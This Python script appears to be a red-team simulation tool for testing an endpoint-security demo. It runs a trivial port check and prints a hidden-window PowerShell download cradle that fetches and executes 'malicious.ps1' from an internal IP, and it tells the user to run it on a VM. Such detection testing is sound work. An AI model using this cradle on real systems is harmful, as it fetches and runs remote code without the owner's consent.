# Red Team Toolkit for SentinelOneX Demo
# This script simulates adversary actions to test the platform.
import argparse
import subprocess
import requests
import time

# Create a main function and use argparse to accept a target IP address and a mode.
# The modes should be 'network' for a router scan and 'endpoint' for a workstation attack.

def simulate_network_scan(target_ip):
    """Simulates a vulnerability scan against the network router."""
    print(f"[+] Simulating network scan against router at {target_ip}...")
    ports = [80, 23]
    for port in ports:
        try:
            requests.get(f"http://{target_ip}:{port}", timeout=0.5)
            print(f"    [+] Connected to {target_ip}:{port}")
        except requests.exceptions.ConnectionError:
            print(f"    [-] Could not connect to {target_ip}:{port}")
        except requests.exceptions.Timeout:
            print(f"    [-] Connection to {target_ip}:{port} timed out")
    print("[+] Network scan simulation complete.")

def simulate_endpoint_attack(target_hostname):
    """Simulates an endpoint compromise via PowerShell."""
    print(f"[*] Simulating endpoint attack on host: {target_hostname}")
    print("\n--- ACTION REQUIRED ---")
    print("Copy and run the following command in a PowerShell terminal on your Windows VM:")
    # Generate a command that looks like a malicious PowerShell download cradle.
    # This command doesn't need to actually work, it just needs to look realistic for the agent to detect.
    powershell_command = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15/malicious.ps1')\""
    print(f"\n{powershell_command}\n")
    print("--------------------")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SentinelOneX Red Team Toolkit")
    parser.add_argument("--target", required=True, help="Target IP address or hostname")
    parser.add_argument("--mode", required=True, choices=['network', 'endpoint'], help="Attack mode: 'network' or 'endpoint'")
    args = parser.parse_args()

    if args.mode == 'network':
        simulate_network_scan(args.target)
    elif args.mode == 'endpoint':
        simulate_endpoint_attack(args.target)
